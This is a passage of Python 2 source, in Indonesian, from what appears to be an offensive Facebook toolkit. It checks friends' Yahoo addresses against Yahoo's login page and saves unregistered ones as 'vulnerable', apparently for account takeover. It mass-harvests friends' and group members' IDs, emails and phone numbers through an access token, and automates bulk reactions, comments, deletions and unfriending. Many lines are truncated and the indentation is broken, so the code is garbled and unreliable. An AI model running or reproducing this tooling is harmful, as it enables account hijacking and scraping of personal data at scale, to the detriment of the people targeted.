        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo>
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x>
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + na>
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' >
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x>
        except KeyError:
            pass

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_yahoo()


def yahoolist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')                                                                                                   print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;91m[!] File tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_yahoo()                                                                                             
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    save = open('MailVuln.txt', 'w')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b>
    print
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com>
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()                                                                                   except:
                print '\x1b[1;91m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;92m ' + mail
            else:
                print '\x1b[1;91m ' + mail

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_yahoo()


def grab():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Ambil ID teman'
    print '\x1b[1;37;40m2. Ambil ID teman dari teman'
    print '\x1b[1;37;40m3. Ambil ID member GRUP'
    print '\x1b[1;37;40m4. Ambil Email teman'
    print '\x1b[1;37;40m5. Ambil Email teman dari teman'
    print '\x1b[1;37;40m6. Ambil No HP teman'
    print '\x1b[1;37;40m7. Ambil No HP teman dari teman'
    print '\x1b[1;31;40m0. Kembali'
    print
    grab_pilih()


def grab_pilih():
    cuih = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if cuih == '':
        print '\x1b[1;91m[!] Jangan kosong'
        grab_pilih()
    else:
        if cuih == '1':
            id_teman()
        else:
            if cuih == '2':
                idfrom_teman()
            else:
                if cuih == '3':
                    id_member_grup()
                else:
                    if cuih == '4':
                        email()
                    else:
                        if cuih == '5':
                            emailfrom_teman()
                        else:
                            if cuih == '6':
                                nomor_hp()
                            else:
                                if cuih == '7':
                                    hpfrom_teman()
                                else:
                                    if cuih == '0':
                                        menu_hack()
                                    else:
                                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + cuih + ' \x1b[1;91mTidak ada'
                                        grab_pilih()

                                                                                                                     def id_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_id, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['data']:
                idteman.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 40 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID \x1b[1;96m%s' % len(idteman)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + save_id
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
            except KeyError:
            os.remove(save_id)
            print '\x1b[1;91m[!] Kesalahan terjadi'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()


def idfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()                                                                                                          else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['nam>
            except KeyError:
                print '\x1b[1;91m[!] Belum berteman'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                grab()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + tok>
            z = json.loads(r.text)
            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m>
            bz = open(save_idt, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['friends']['data']:
                idfromteman.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 40 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID \x1b[1;96m%s' % len(idfromteman)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + save_idt
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()


def id_member_grup():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + as>
            except KeyError:
                print '\x1b[1;91m[!] Grup tidak ditemukan'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                grab()

            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + i['name']
                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                print 40 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Grup tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()


def email():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Email\x1b[1;96m%s' % len(em)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(mails)
            print '\x1b[1;91m[!] Kesalahan terjadi'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()


def emailfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['nam>
            except KeyError:
                print '\x1b[1;91m[!] Belum berteman'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                grab()

            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromteman.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Email\x1b[1;96m%s' % len(emfromteman)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()
            def nomor_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mNomor\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Nomor\x1b[1;96m%s' % len(hp)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] Kesalahan terjadi'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()


def hpfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['nam>
            except KeyError:
                print '\x1b[1;91m[!] Belum berteman'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                grab()
                noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hpfromteman.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mNomor\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Nomor\x1b[1;96m%s' % len(hpfromteman)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()


def menu_bot():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Bot Reactions Target Post'
    print '\x1b[1;37;40m2. Bot Reactions Grup Post'
    print '\x1b[1;37;40m3. Bot Komen Target Post'
    print '\x1b[1;37;40m4. Bot Komen Grup Post'
    print '\x1b[1;37;40m5. Mass delete Post'
    print '\x1b[1;37;40m6. Terima permintaan pertemanan'
    print '\x1b[1;37;40m7. Hapus pertemanan'
    print '\x1b[1;31;40m0. Kembali'
    print
    bot_pilih()
    def bot_pilih():
    bots = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if bots == '':
        print '\x1b[1;91m[!] Jangan kosong'
        bot_pilih()
    else:
        if bots == '1':
            menu_react()
        else:
            if bots == '2':
                grup_react()
            else:
                if bots == '3':
                    bot_komen()
                else:
                    if bots == '4':
                        grup_komen()
                    else:
                        if bots == '5':
                            deletepost()
                        else:
                            if bots == '6':
                                accept()
                            else:
                                if bots == '7':
                                    unfriend()
                                else:
                                    if bots == '0':
                                        menu()
                                    else:
                                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + bots + ' \x1b[1;91mTidak ada'
                                        bot_pilih()


def menu_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. \x1b[1;97mLike'
    print '\x1b[1;37;40m2. \x1b[1;97mLove'
    print '\x1b[1;37;40m3. \x1b[1;97mWow'
    print '\x1b[1;37;40m4. \x1b[1;97mHaha'
    print '\x1b[1;37;40m5. \x1b[1;97mSedih'
    print '\x1b[1;37;40m6. \x1b[1;97mMarah'
    print '\x1b[1;31;40m0. Kembali'
    print
    react_pilih()
    def react_pilih():
    global tipe
    aksi = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if aksi == '':
        print '\x1b[1;91m[!] Jangan kosong'
        react_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            react()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                react()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    react()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        react()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            react()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                react()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97>
                                    react_pilih()
                                    def react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;>
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97>
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=>
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;>
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions>
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '>

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(re>
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()


def grup_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
        os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. \x1b[1;97mLike'
    print '\x1b[1;37;40m2. \x1b[1;97mLove'
    print '\x1b[1;37;40m3. \x1b[1;97mWow'
    print '\x1b[1;37;40m4. \x1b[1;97mHaha'
    print '\x1b[1;37;40m5. \x1b[1;97mSedih'
    print '\x1b[1;37;40m6. \x1b[1;97mMarah'
    print '\x1b[1;31;40m0. Kembali'
    print
    reactg_pilih()


def reactg_pilih():
    global tipe
    aksi = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if aksi == '':
        print '\x1b[1;91m[!] Jangan kosong'
        reactg_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            reactg()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                reactg()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    reactg()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        reactg()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            reactg()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97>
                                    reactg_pilih()


def reactg():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup \x1b[1;91m:\x1b[1;97>
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97>
        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&a>
        asw = json.loads(ah.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama gr>
        try:
            oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fi>
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;>
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for a in ah['feed']['data']:
                y = a['id']
                reaksigrup.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions>
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '>

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(re>
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
            def bot_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk>
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;>
